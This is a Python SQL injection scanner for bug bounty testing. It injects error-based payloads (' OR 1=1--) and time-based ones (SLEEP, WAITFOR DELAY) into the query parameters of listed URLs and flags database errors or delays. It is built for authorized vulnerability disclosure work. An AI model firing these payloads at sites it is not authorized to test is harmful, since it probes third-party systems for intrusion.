#!/usr/bin/env python3
"""
sqli_detector.py
Ethical SQL injection vulnerability detector for bug bounty programs.
DETECTION ONLY - Does not exploit or extract data.

Usage: python3 sqli_detector.py <urls_file.txt> <output_dir>
"""

import asyncio
import aiohttp
import re
import time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Set
import json

class SQLiDetector:
    def __init__(self, output_dir: Path, concurrency: int = 10):
        self.output_dir = output_dir
        self.concurrency = concurrency
        self.findings = []
        
        # Detection payloads (NON-DESTRUCTIVE)
        self.error_payloads = [
            "'",
            "\"",
            "1'",
            "1\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "'; --",
            "\"; --",
        ]
        
        # Time-based detection (safe delays)
        self.time_payloads = [
            "' AND SLEEP(5)--",
            "\" AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "\"; WAITFOR DELAY '0:0:5'--",
        ]
        
        # SQL error patterns (common database errors)
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySqlException",
            r"SQLSTATE\[",
            r"SQLException",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Oracle error",
            r"Oracle.*Driver",
            r"ORA-\d{5}",
            r"PostgreSQL.*ERROR",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"supplied argument is not a valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org.postgresql.util.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"db2_\w+\(\)",
            r"CLI Driver.*DB2",
            r"Dynamic SQL Error",
            r"Sybase message",
        ]
        
        self.compiled_patterns = [re.compile(p, re.IGNORECASE) for p in self.error_patterns]
    
    async def scan_urls(self, urls: List[str]):
        """Scan list of URLs for SQL injection vulnerabilities"""
        print(f"[*] Scanning {len(urls)} URLs for SQL injection...")
        
        sem = asyncio.Semaphore(self.concurrency)
        
        async def scan_with_semaphore(url):
            async with sem:
                return await self.scan_url(url)
        
        tasks = [scan_with_semaphore(url) for url in urls]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        self.save_findings()
    
    async def scan_url(self, url: str):
        """Scan a single URL"""
        parsed = urlparse(url)
        
        # Only scan URLs with parameters
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        if not params:
            return
        
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Test each parameter
        for param_name in params.keys():
            await self.test_parameter(base_url, params, param_name)
    
    async def test_parameter(self, base_url: str, params: Dict, test_param: str):
        """Test a specific parameter for SQL injection"""
        
        # Get baseline response
        baseline = await self.make_request(base_url, params)
        if not baseline:
            return
        
        # Test error-based SQL injection
        await self.test_error_based(base_url, params, test_param, baseline)
        
        # Test time-based SQL injection
        await self.test_time_based(base_url, params, test_param)
    
    async def test_error_based(self, base_url: str, params: Dict, test_param: str, baseline: Dict):
        """Test for error-based SQL injection"""
        
        for payload in self.error_payloads:
            test_params = params.copy()
            original_value = test_params[test_param][0] if test_params[test_param] else ""
            test_params[test_param] = [payload]
            
            response = await self.make_request(base_url, test_params)
            if not response:
                continue
            
            # Check for SQL errors in response
            for pattern in self.compiled_patterns:
                if pattern.search(response['body']):
                    # Check if this is a new error (not in baseline)
                    baseline_has_error = any(p.search(baseline['body']) for p in self.compiled_patterns)
                    
                    if not baseline_has_error:
                        self.add_finding(
                            url=base_url,
                            parameter=test_param,
                            payload=payload,
                            vulnerability_type="Error-based SQL Injection",
                            evidence=pattern.pattern,
                            confidence="High"
                        )
                        print(f"[+] Potential SQLi found: {base_url} (param: {test_param})")
                        return  # Found vulnerability, no need to test more payloads
            
            # Check for significant response differences
            if abs(len(response['body']) - len(baseline['body'])) > 500:
                # Significant content length change might indicate injection
                self.add_finding(
                    url=base_url,
                    parameter=test_param,
                    payload=payload,
                    vulnerability_type="Possible SQL Injection (Content Length Change)",
                    evidence=f"Baseline: {len(baseline['body'])} bytes, Test: {len(response['body'])} bytes",
                    confidence="Medium"
                )
    
    async def test_time_based(self, base_url: str, params: Dict, test_param: str):
        """Test for time-based SQL injection"""
        
        # Get baseline timing (average of 3 requests)
        baseline_times = []
        for _ in range(3):
            start = time.time()
            response = await self.make_request(base_url, params)
            if response:
                baseline_times.append(time.time() - start)
        
        if not baseline_times:
            return
        
        avg_baseline = sum(baseline_times) / len(baseline_times)
        
        # Test time-based payloads
        for payload in self.time_payloads:
            test_params = params.copy()
            test_params[test_param] = [payload]
            
            start = time.time()
            response = await self.make_request(base_url, test_params, timeout=15)
            elapsed = time.time() - start
            
            # If response took significantly longer (4+ seconds more than baseline)
            if elapsed > (avg_baseline + 4):
                self.add_finding(
                    url=base_url,
                    parameter=test_param,
                    payload=payload,
                    vulnerability_type="Time-based SQL Injection",
                    evidence=f"Response time: {elapsed:.2f}s (baseline: {avg_baseline:.2f}s)",
                    confidence="High"
                )
                print(f"[+] Time-based SQLi found: {base_url} (param: {test_param})")
                return
    
    async def make_request(self, base_url: str, params: Dict, timeout: int = 10) -> Dict:
        """Make HTTP request with parameters"""
        try:
            # Convert params dict to proper format
            query_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            
            async with aiohttp.ClientSession() as session:
                timeout_obj = aiohttp.ClientTimeout(total=timeout)
                async with session.get(base_url, params=query_params, timeout=timeout_obj, allow_redirects=True) as resp:
                    body = await resp.text()
                    return {
                        'status': resp.status,
                        'body': body,
                        'headers': dict(resp.headers)
                    }
        except asyncio.TimeoutError:
            return None
        except Exception as e:
            return None
    
    def add_finding(self, url: str, parameter: str, payload: str, vulnerability_type: str, evidence: str, confidence: str):
        """Add a finding to the results"""
        finding = {
            'url': url,
            'parameter': parameter,
            'payload': payload,
            'type': vulnerability_type,
            'evidence': evidence,
            'confidence': confidence,
            'recommendation': 'Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.'
        }
        self.findings.append(finding)
    
    def save_findings(self):
        """Save findings to files"""
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # JSON format (detailed)
        json_file = self.output_dir / "sqli_findings.json"
        with open(json_file, 'w') as f:
            json.dump(self.findings, f, indent=2)
        print(f"\n[+] Detailed findings saved to: {json_file}")
        
        # Text format (summary for bug bounty reports)
        txt_file = self.output_dir / "sqli_findings.txt"
        with open(txt_file, 'w') as f:
            f.write("SQL INJECTION VULNERABILITY REPORT\n")
            f.write("=" * 80 + "\n\n")
            f.write("IMPORTANT: This is a detection report only. Do NOT exploit these vulnerabilities.\n")
            f.write("Report these findings to the bug bounty program immediately.\n\n")
            
            for i, finding in enumerate(self.findings, 1):
                f.write(f"Finding #{i}\n")
                f.write("-" * 80 + "\n")
                f.write(f"URL: {finding['url']}\n")
                f.write(f"Parameter: {finding['parameter']}\n")
                f.write(f"Vulnerability Type: {finding['type']}\n")
                f.write(f"Confidence: {finding['confidence']}\n")
                f.write(f"Test Payload: {finding['payload']}\n")
                f.write(f"Evidence: {finding['evidence']}\n")
                f.write(f"Recommendation: {finding['recommendation']}\n")
                f.write("\n")
        
        print(f"[+] Summary report saved to: {txt_file}")
        print(f"\n[*] Total findings: {len(self.findings)}")
        
        if self.findings:
            print("\n[!] IMPORTANT: Report these vulnerabilities through proper channels.")
            print("[!] Do NOT attempt to exploit or extract data.")

async def main():
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 sqli_detector.py <urls_file.txt> <output_dir>")
        print("\nExample:")
        print("  python3 sqli_detector.py output/target.com/wayback_urls.txt output/target.com/sqli")
        print("\nThis tool performs DETECTION ONLY - ethical bug bounty testing.")
        sys.exit(1)
    
    urls_file = Path(sys.argv[1])
    output_dir = Path(sys.argv[2])
    
    if not urls_file.exists():
        print(f"[!] URLs file not found: {urls_file}")
        sys.exit(1)
    
    # Load URLs
    urls = [line.strip() for line in urls_file.read_text().splitlines() if line.strip()]
    
    # Filter to only URLs with parameters
    urls_with_params = [u for u in urls if '?' in u and '=' in u]
    
    print(f"[*] Loaded {len(urls)} URLs")
    print(f"[*] {len(urls_with_params)} URLs have parameters to test")
    
    if not urls_with_params:
        print("[!] No URLs with parameters found")
        sys.exit(0)
    
    # Run detector
    detector = SQLiDetector(output_dir, concurrency=10)
    await detector.scan_urls(urls_with_params)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
